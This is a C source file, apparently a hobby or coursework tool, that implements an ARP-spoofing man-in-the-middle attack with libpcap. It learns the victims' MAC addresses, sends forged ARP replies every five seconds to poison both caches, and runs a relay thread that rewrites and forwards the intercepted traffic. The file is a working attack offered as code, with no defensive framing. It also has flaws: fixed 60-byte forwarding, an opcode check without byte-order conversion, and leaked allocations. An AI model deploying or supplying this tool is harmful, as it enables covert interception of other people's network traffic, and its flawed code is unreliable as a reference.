#include "arp_spoof.h"

void get_mac(u_int8_t *mac_addr, u_int8_t *interface) {
	u_int32_t s,i;
	struct ifreq ifr;
	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, sizeof(ifr.ifr_name));
	ioctl(s, SIOCGIFHWADDR, &ifr);
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
	close(s);
}

void get_ip(u_int8_t *ip_addr, u_int8_t *interface) {
	u_int32_t s;
	struct ifreq ifr;
	s = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(s, SIOCGIFADDR, &ifr);
	memcpy(ip_addr, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, IP_ADDR_LEN);
	close(s);
}

void print_mac(u_int8_t *mac_addr, u_int8_t *name) {
	u_int32_t i;
	printf("[+]MAC addr of %-9s: ", name);
	for(i=0;i<6;i++) {
		if(i != 5)
			printf("%02x:", mac_addr[i]);
		else
			printf("%02x\n", mac_addr[i]);
	}
}

void print_ip(u_int8_t *ip_addr, u_int8_t *name) {
	u_int32_t i;
	printf("[+]IP  addr of %-9s: ", name);
	for(i=0;i<4;i++) {
		if(i != 3)
			printf("%d.", ip_addr[i]);
		else
			printf("%d\n", ip_addr[i]);
	}
}

void gen_arp_packet(u_int8_t *packet, u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *src_ip, u_int8_t *dst_ip, u_int16_t opcode) {
	struct ether_header *eptr;
	struct arp_header *aptr;

	eptr = (struct ether_header *)malloc(sizeof(struct ether_header));
	aptr = (struct arp_header *)malloc(sizeof(struct arp_header));

	if(dst_mac != NULL)
		memcpy(eptr->ether_dhost, dst_mac, ETHER_ADDR_LEN);
	else
		memcpy(eptr->ether_dhost, "\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN);
	memcpy(eptr->ether_shost, src_mac, ETHER_ADDR_LEN);
	eptr->ether_type = htons(ETHERTYPE_ARP);

	aptr->ar_hrd = htons(ARPHRD_ETHER);
	aptr->ar_pro = htons(ETHERTYPE_IP);
	aptr->ar_hln = 6;
	aptr->ar_pln = 4;
	aptr->ar_op = htons(opcode);
	memcpy(aptr->ar_sha, src_mac, ETHER_ADDR_LEN);
	memcpy(aptr->ar_sip, src_ip, IP_ADDR_LEN);
	if(dst_mac != NULL)
		memcpy(aptr->ar_tha, dst_mac, ETHER_ADDR_LEN);
	else
		memcpy(aptr->ar_tha, "\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN);
	memcpy(aptr->ar_tip, dst_ip, IP_ADDR_LEN);

	memcpy(packet, eptr, sizeof(struct ether_header));
	memcpy(packet + sizeof(struct ether_header), aptr, sizeof(struct arp_header));
}

void *arp_spoof(void *data) {
	pthread_t thread;
	u_int8_t sender_packet[60];
	u_int8_t target_packet[60];
	const u_int8_t *packet_recv;
	struct pcap_pkthdr *header;
	struct pthread_arg *arg;
	struct ether_header *eptr;
	struct arp_header *aptr;

	arg = (struct pthread_arg *)data;
	
	gen_arp_packet(sender_packet, arg->attacker_mac, NULL, arg->attacker_ip, arg->sender_ip, ARPOP_REQUEST);

	if(pcap_sendpacket(arg->handle, sender_packet, 60) != 0) {
		printf("Coludn't send packet\n");
		pthread_exit((void *) 0);
	}

	while(1) {
		pcap_next_ex(arg->handle, &header, &packet_recv);
		eptr = (struct ether_header *) packet_recv;
		aptr = (struct arp_header *) (packet_recv + sizeof(struct ether_header));
		if(ntohs(eptr->ether_type) == ETHERTYPE_ARP && ntohs(aptr->ar_op) == ARPOP_REPLY)
			break;
	}
	memcpy(arg->sender_mac, aptr->ar_sha, ETHER_ADDR_LEN);

	gen_arp_packet(target_packet, arg->attacker_mac, NULL, arg->attacker_ip, arg->target_ip, ARPOP_REQUEST);

	if(pcap_sendpacket(arg->handle, target_packet, 60) != 0) {
		printf("Couldn't send packet\n");
		pthread_exit((void *) 0);
	}

	while(1) {
		pcap_next_ex(arg->handle, &header, &packet_recv);
		eptr = (struct ether_header *) packet_recv;
		aptr = (struct arp_header *) (packet_recv + sizeof(struct ether_header));
		if(ntohs(eptr->ether_type) == ETHERTYPE_ARP && ntohs(aptr->ar_op) == ARPOP_REPLY)
			break;
	}
	memcpy(arg->target_mac, aptr->ar_sha, ETHER_ADDR_LEN);
	
	printf("\n----------Session %d----------\n", arg->session_num);
	print_mac(arg->sender_mac, "Sender");
	print_mac(arg->target_mac, "Target");
	printf("-----------------------------\n");

	gen_arp_packet(sender_packet, arg->attacker_mac, arg->sender_mac, arg->target_ip, arg->sender_ip, ARPOP_REPLY);
	gen_arp_packet(target_packet, arg->attacker_mac, arg->target_mac, arg->sender_ip, arg->target_ip, ARPOP_REPLY);

	pcap_sendpacket(arg->handle, sender_packet, 60);
	pcap_sendpacket(arg->handle, target_packet, 60);
	
	pthread_create(&thread, NULL, relay, (void *)arg);
	while(1) {
		if(pcap_sendpacket(arg->handle, sender_packet, 60) != 0) {
			printf("Couldn't send packet\n");
			pthread_exit((void *) 0);
		}
		if(pcap_sendpacket(arg->handle, target_packet, 60) != 0) {
			printf("Couldn't send packet\n");
			pthread_exit((void *) 0);
		}
		sleep(5);
	}
}

void *relay(void *data) {
	u_int8_t *packet;
	u_int8_t sender_packet[60];
	u_int8_t target_packet[60];
	const u_int8_t *packet_recv;
	struct pcap_pkthdr *header;
	struct pthread_arg *arg;
	struct ether_header *eptr;
	struct arp_header *aptr;
	struct ip *iptr;

	arg = (struct pthread_arg *)data;

	gen_arp_packet(sender_packet, arg->attacker_mac, arg->sender_mac, arg->target_ip, arg->sender_ip, ARPOP_REPLY);
	gen_arp_packet(target_packet, arg->attacker_mac, arg->target_mac, arg->sender_ip, arg->target_ip, ARPOP_REPLY);

	while(1) {
		pcap_next_ex(arg->handle, &header, &packet_recv);
		eptr = (struct ether_header *) packet_recv;

		if(ntohs(eptr->ether_type) == ETHERTYPE_ARP) {
			aptr = (struct arp_header *) (packet_recv + sizeof(struct ether_header));

			if(aptr->ar_op == ARPOP_REQUEST) {
				if(memcmp(aptr->ar_sip, arg->sender_ip, IP_ADDR_LEN) == 0 && memcmp(aptr->ar_tip, arg->target_ip, IP_ADDR_LEN) == 0)
					pcap_sendpacket(arg->handle, sender_packet, 60);
				if(memcmp(aptr->ar_sip, arg->target_ip, IP_ADDR_LEN) == 0 && memcmp(aptr->ar_tip, arg->sender_ip, IP_ADDR_LEN) == 0)
					pcap_sendpacket(arg->handle, target_packet, 60);
			}
		}
		if(ntohs(eptr->ether_type) == ETHERTYPE_IP) {
			iptr = (struct ip *) (packet_recv + sizeof(struct ether_header));

			if(memcmp(&iptr->ip_src.s_addr, arg->sender_ip, IP_ADDR_LEN) == 0) {
				printf("\n----------Session %d----------\n", arg->session_num);
				printf("Captured packet from sender");
				printf("\n-----------------------------\n");
				packet = (u_int8_t *) packet_recv;
				memcpy(packet, arg->target_mac, ETHER_ADDR_LEN);
				memcpy(packet + 6, arg->attacker_mac, ETHER_ADDR_LEN);
				pcap_sendpacket(arg->handle, packet, 60);
			}
			if(memcmp(&iptr->ip_dst.s_addr, arg->sender_ip, IP_ADDR_LEN) == 0) {
				printf("\n----------Session %d----------\n", arg->session_num);
				printf("Captured packet to sender");
				printf("\n-----------------------------\n");
				packet = (u_int8_t *) packet_recv;
				memcpy(packet, arg->sender_mac, ETHER_ADDR_LEN);
				memcpy(packet + 6, arg->attacker_mac, ETHER_ADDR_LEN);
				pcap_sendpacket(arg->handle, packet, 60);
			}
		}
	}
}
